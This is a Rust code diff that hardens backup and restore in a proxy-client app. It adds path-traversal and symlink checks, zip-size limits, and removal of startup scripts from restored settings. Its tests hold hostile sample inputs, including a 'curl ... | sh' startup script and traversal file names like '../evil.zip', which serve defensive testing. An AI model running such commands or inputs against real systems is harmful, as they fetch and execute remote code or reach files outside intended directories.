@@ -7,13 +7,16 @@ use crate::{
         help,
     },
 };
-use anyhow::{Result, anyhow};
+use anyhow::{Result, anyhow, bail};
 use chrono::Utc;
 use clash_verge_logging::{Type, logging, logging_error};
 use reqwest_dav::list_cmd::ListFile;
 use serde::Serialize;
 use smartstring::alias::String;
-use std::path::PathBuf;
+use std::{
+    ffi::OsStr,
+    path::{Path, PathBuf},
+};
 use tokio::fs;
 
 #[derive(Debug, Serialize, specta::Type)]
@@ -27,6 +30,46 @@ pub struct LocalBackupFile {
     pub content_length: u64,
 }
 
+/// Accepts only a bare backup file name so it cannot escape its containing directory.
+fn sanitize_backup_filename(filename: &str) -> Result<&str> {
+    if filename.is_empty() {
+        bail!("Backup filename must not be empty");
+    }
+    if filename.chars().any(char::is_control) {
+        bail!("Backup filename must not contain control characters");
+    }
+    if filename == ".." || filename.contains('/') || filename.contains('\\') {
+        bail!("Backup filename must not contain path separators: {filename}");
+    }
+    if Path::new(filename).file_name() != Some(OsStr::new(filename)) {
+        bail!("Invalid backup filename: {filename}");
+    }
+    Ok(filename)
+}
+
+/// Resolves a backup file name inside `dir`, rejecting names and symlinks that escape it.
+fn resolve_within(dir: &Path, filename: &str) -> Result<PathBuf> {
+    let filename = sanitize_backup_filename(filename)?;
+    let canonical_dir = std::fs::canonicalize(dir)
+        .map_err(|err| anyhow!("Failed to resolve backup directory {}: {err}", dir.display()))?;
+    let path = canonical_dir.join(filename);
+    if !path.starts_with(&canonical_dir) {
+        bail!("Backup path escapes {}", canonical_dir.display());
+    }
+    // Follow an existing target so a symlink planted in the directory cannot redirect the operation.
+    if let Ok(resolved) = std::fs::canonicalize(&path)
+        && !resolved.starts_with(&canonical_dir)
+    {
+        bail!("Backup path escapes {}", canonical_dir.display());
+    }
+    Ok(path)
+}
+
+/// Drops `startup_script` from untrusted restored settings; it must be enabled again explicitly.
+fn strip_untrusted_startup_script(verge: &mut IVerge) -> bool {
+    verge.startup_script.take().is_some()
+}
+
 /// Reloads restored configs into memory while preserving WebDAV credentials.
 async fn finalize_restored_verge_config(
     webdav_url: Option<String>,
@@ -35,6 +78,13 @@ async fn finalize_restored_verge_config(
 ) -> Result<()> {
     // A broken restored `verge.yaml` is a restore failure, not a reason to load defaults.
     let mut restored = help::read_yaml::<IVerge>(&verge_path()?).await?;
+    if strip_untrusted_startup_script(&mut restored) {
+        logging!(
+            warn,
+            Type::Backup,
+            "Ignored startup_script from the restored backup; enable it explicitly to run it again"
+        );
+    }
     restored.webdav_url = webdav_url;
     restored.webdav_username = webdav_username;
     restored.webdav_password = webdav_password;
@@ -94,13 +144,13 @@ async fn finalize_restored_verge_config(
 
 #[tracing::instrument(skip_all, level = "info")]
 pub async fn create_backup_and_upload_webdav() -> Result<()> {
-    let (file_name, temp_file_path) = backup::create_backup().await.map_err(|err| {
+    let (file_name, temp_file) = backup::create_backup().await.map_err(|err| {
         logging!(error, Type::Backup, "Failed to create backup: {err:#}");
         err
     })?;
 
     if let Err(err) = backup::WebDavClient::global()
-        .upload(temp_file_path.clone(), file_name)
+        .upload(temp_file.path().to_path_buf(), file_name)
         .await
     {
         logging!(error, Type::Backup, "Failed to upload to WebDAV: {err:#}");
@@ -108,7 +158,7 @@ pub async fn create_backup_and_upload_webdav() -> Result<()> {
         return Err(err);
     }
 
-    if let Err(err) = temp_file_path.remove_if_exists().await {
+    if let Err(err) = temp_file.remove() {
         logging!(warn, Type::Backup, "Failed to remove temp file: {err:#}");
     }
 
@@ -124,6 +174,7 @@ pub async fn list_wevdav_backup() -> Result<Vec<ListFile>> {
 
 pub async fn delete_webdav_backup(filename: String) -> Result<()> {
     let name = filename.to_string();
+    let filename = String::from(sanitize_backup_filename(&filename)?);
     backup::WebDavClient::global().delete(filename).await.map_err(|err| {
         logging!(
             error,
@@ -142,9 +193,9 @@ pub async fn restore_webdav_backup(filename: String) -> Result<()> {
     let webdav_username = verge_data.webdav_username.clone();
     let webdav_password = verge_data.webdav_password.clone();
 
-    let backup_storage_path = app_home_dir()
-        .map_err(|e| anyhow::anyhow!("Failed to get app home dir: {e}"))?
-        .join(filename.as_str());
+    let app_home = app_home_dir().map_err(|e| anyhow::anyhow!("Failed to get app home dir: {e}"))?;
+    let backup_storage_path = resolve_within(&app_home, &filename)?;
+    let filename = String::from(sanitize_backup_filename(&filename)?);
     let name = filename.to_string();
     backup::WebDavClient::global()
         .download(filename, backup_storage_path.clone())
@@ -158,11 +209,61 @@ pub async fn restore_webdav_backup(filename: String) -> Result<()> {
             err
         })?;
 
+    // Remove the downloaded archive on every path, including extraction or restore failures.
+    let _cleanup = scopeguard::guard(backup_storage_path.clone(), |path: PathBuf| {
+        let _ = std::fs::remove_file(path);
+    });
+
     let _profile_write = crate::config::profiles::PROFILE_WRITE_LOCK.lock().await;
-    extract_backup(backup_storage_path.clone()).await?;
-    let res = finalize_restored_verge_config(webdav_url, webdav_username, webdav_password).await;
-    let _ = backup_storage_path.remove_if_exists().await;
-    res
+    extract_backup(backup_storage_path).await?;
+    finalize_restored_verge_config(webdav_url, webdav_username, webdav_password).await
+}
+
+const MAX_BACKUP_ENTRIES: usize = 10_000;
+const MAX_BACKUP_UNCOMPRESSED_BYTES: u64 = 512 * 1024 * 1024;
+
+#[derive(Debug, Clone, Copy)]
+struct ArchiveLimits {
+    max_entries: usize,
+    max_uncompressed_bytes: u64,
+}
+
+impl Default for ArchiveLimits {
+    fn default() -> Self {
+        Self {
+            max_entries: MAX_BACKUP_ENTRIES,
+            max_uncompressed_bytes: MAX_BACKUP_UNCOMPRESSED_BYTES,
+        }
+    }
+}
+
+/// Rejects archives that could exhaust memory or disk when extracted.
+fn validate_zip_archive<R: std::io::Read + std::io::Seek>(
+    zip: &mut zip::ZipArchive<R>,
+    limits: ArchiveLimits,
+) -> Result<()> {
+    if zip.len() > limits.max_entries {
+        bail!(
+            "Backup archive contains {} entries, more than the limit of {}",
+            zip.len(),
+            limits.max_entries
+        );
+    }
+
+    let mut total: u64 = 0;
+    for index in 0..zip.len() {
+        let entry = zip.by_index(index)?;
+        total = total
+            .checked_add(entry.size())
+            .ok_or_else(|| anyhow!("Backup archive uncompressed size overflowed"))?;
+        if total > limits.max_uncompressed_bytes {
+            bail!(
+                "Backup archive expands to more than {} bytes",
+                limits.max_uncompressed_bytes
+            );
+        }
+    }
+    Ok(())
 }
 
 async fn extract_backup(zip_path: PathBuf) -> Result<()> {
@@ -170,6 +271,7 @@ async fn extract_backup(zip_path: PathBuf) -> Result<()> {
     AsyncHandler::spawn_blocking(move || {
         let file = std::fs::File::open(zip_path)?;
         let mut zip = zip::ZipArchive::new(file)?;
+        validate_zip_archive(&mut zip, ArchiveLimits::default())?;
         zip.extract(target)?;
         Ok(())
     })
@@ -187,7 +289,7 @@ pub async fn create_local_backup_with_namer<F>(namer: F) -> Result<String>
 where
     F: FnOnce(&str) -> String,
 {
-    let (file_name, temp_file_path) = backup::create_backup().await.map_err(|err| {
+    let (file_name, temp_file) = backup::create_backup().await.map_err(|err| {
         logging!(error, Type::Backup, "Failed to create local backup: {err:#}");
         err
     })?;
@@ -196,23 +298,18 @@ where
     let final_name = namer(file_name.as_str());
     let target_path = backup_dir.join(final_name.as_str());
 
-    if let Err(err) = move_file(temp_file_path.clone(), target_path.clone()).await {
+    if let Err(err) = move_file(temp_file.path().to_path_buf(), target_path.clone()).await {
         logging!(
             error,
             Type::Backup,
             "Failed to move local backup file to {}: {err:#}",
             target_path.display()
         );
-        if let Err(clean_err) = temp_file_path.remove_if_exists().await {
-            logging!(
-                warn,
-                Type::Backup,
-                "Failed to remove temp backup file after move error: {clean_err:#}"
-            );
-        }
+        // Dropping the guard removes the temporary archive.
         return Err(err);
     }
 
+    let _ = temp_file.persist();
     Ok(final_name)
 }
 
@@ -324,7 +421,7 @@ pub async fn list_local_backup() -> Result<Vec<LocalBackupFile>> {
 
 pub async fn delete_local_backup(filename: String) -> Result<()> {
     let backup_dir = local_backup_dir()?;
-    let target_path = backup_dir.join(filename.as_str());
+    let target_path = resolve_within(&backup_dir, &filename)?;
     if !target_path.exists() {
         logging!(debug, Type::Backup, "Local backup file not found: {}", filename);
         return Ok(());
@@ -336,7 +433,7 @@ pub async fn delete_local_backup(filename: String) -> Result<()> {
 #[tracing::instrument(skip_all, level = "info", fields(filename = %filename))]
 pub async fn restore_local_backup(filename: String) -> Result<()> {
     let backup_dir = local_backup_dir()?;
-    let target_path = backup_dir.join(filename.as_str());
+    let target_path = resolve_within(&backup_dir, &filename)?;
     if !target_path.exists() {
         return Err(anyhow!("Backup file not found: {}", filename));
     }
@@ -360,7 +457,7 @@ pub async fn restore_local_backup(filename: String) -> Result<()> {
 #[tracing::instrument(skip_all, level = "info", fields(filename = %filename, destination = %destination))]
 pub async fn export_local_backup(filename: String, destination: String) -> Result<()> {
     let backup_dir = local_backup_dir()?;
-    let source_path = backup_dir.join(filename.as_str());
+    let source_path = resolve_within(&backup_dir, &filename)?;
     if !source_path.exists() {
         return Err(anyhow!("Backup file not found: {}", filename));
     }
@@ -375,4 +472,128 @@ pub async fn export_local_backup(filename: String, destination: String) -> Resul
         .map(|_| ())
         .map_err(|err| anyhow!("Failed to export backup file: {err:#}"))?;
     Ok(())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::{
+        ArchiveLimits, resolve_within, sanitize_backup_filename, strip_untrusted_startup_script, validate_zip_archive,
+    };
+    use crate::config::IVerge;
+
+    fn zip_archive(entries: &[(&str, &[u8])]) -> anyhow::Result<zip::ZipArchive<std::io::Cursor<Vec<u8>>>> {
+        let mut writer = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
+        for (name, content) in entries {
+            writer.start_file(*name, zip::write::SimpleFileOptions::default())?;
+            std::io::Write::write_all(&mut writer, content)?;
+        }
+        let bytes = writer.finish()?.into_inner();
+        Ok(zip::ZipArchive::new(std::io::Cursor::new(bytes))?)
+    }
+
+    #[test]
+    fn accepts_a_small_backup_archive() -> anyhow::Result<()> {
+        let mut archive = zip_archive(&[("profiles/a.yaml", b"rules: []"), ("verge.yaml", b"mode: rule")])?;
+        validate_zip_archive(&mut archive, ArchiveLimits::default())?;
+        Ok(())
+    }
+
+    #[test]
+    fn rejects_archives_with_too_many_entries() -> anyhow::Result<()> {
+        let mut archive = zip_archive(&[("one.yaml", b"1"), ("two.yaml", b"2")])?;
+        let limits = ArchiveLimits {
+            max_entries: 1,
+            ..ArchiveLimits::default()
+        };
+        let err = validate_zip_archive(&mut archive, limits)
+            .err()
+            .ok_or_else(|| anyhow::anyhow!("archive with too many entries must be rejected"))?;
+        assert!(err.to_string().contains("entries"), "{err}");
+        Ok(())
+    }
+
+    #[test]
+    fn rejects_archives_that_expand_beyond_the_size_limit() -> anyhow::Result<()> {
+        let mut archive = zip_archive(&[("one.yaml", b"hello"), ("two.yaml", b"world")])?;
+        let limits = ArchiveLimits {
+            max_entries: 10,
+            max_uncompressed_bytes: 8,
+        };
+        let err = validate_zip_archive(&mut archive, limits)
+            .err()
+            .ok_or_else(|| anyhow::anyhow!("archive expanding past the limit must be rejected"))?;
+        assert!(err.to_string().contains("expands"), "{err}");
+        Ok(())
+    }
+
+    #[test]
+    fn restoring_a_backup_never_enables_the_startup_script() {
+        let mut verge = IVerge {
+            startup_script: Some("curl https://example.com/payload | sh".into()),
+            ..IVerge::default()
+        };
+
+        assert!(strip_untrusted_startup_script(&mut verge));
+        assert!(verge.startup_script.is_none());
+        assert!(!strip_untrusted_startup_script(&mut verge));
+    }
+
+    #[test]
+    fn rejects_backup_filenames_that_can_escape_the_backup_directory() {
+        for name in [
+            "",
+            "..",
+            "../evil.zip",
+            "..\\evil.zip",
+            "..\\..\\evil.zip",
+            "/tmp/evil.zip",
+            "C:\\evil.zip",
+            "profiles/evil.zip",
+            "profiles\\evil.zip",
+            "bad\nname.zip",
+            "bad\u{0}name.zip",
+        ] {
+            assert!(
+                sanitize_backup_filename(name).is_err(),
+                "{name:?} should be rejected as a backup filename"
+            );
+        }
+    }
+
+    #[test]
+    fn accepts_plain_backup_filenames() -> anyhow::Result<()> {
+        for name in [
+            "macos-backup-2026-01-01_00-00-00.zip",
+            "backup.zip",
+            ".hidden.zip",
+            "备份.zip",
+        ] {
+            assert_eq!(sanitize_backup_filename(name)?, name);
+        }
+        Ok(())
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn rejects_symlinks_that_escape_the_backup_directory() -> anyhow::Result<()> {
+        let root = std::env::temp_dir().join(format!("clash-verge-backup-paths-{}", nanoid::nanoid!()));
+        std::fs::create_dir_all(&root)?;
+        let parent = root
+            .parent()
+            .ok_or_else(|| anyhow::anyhow!("temporary directory has no parent"))?;
+        let outside = parent.join(format!("clash-verge-outside-{}.zip", nanoid::nanoid!()));
+        std::fs::write(&outside, b"outside")?;
+        std::os::unix::fs::symlink(&outside, root.join("link.zip"))?;
+
+        assert!(resolve_within(&root, "link.zip").is_err());
+        assert_eq!(
+            resolve_within(&root, "normal.zip")?,
+            std::fs::canonicalize(&root)?.join("normal.zip")
+        );
+
+        std::fs::remove_file(root.join("link.zip"))?;
+        std::fs::remove_dir_all(&root)?;
+        std::fs::remove_file(outside)?;
+        Ok(())
+    }
 }
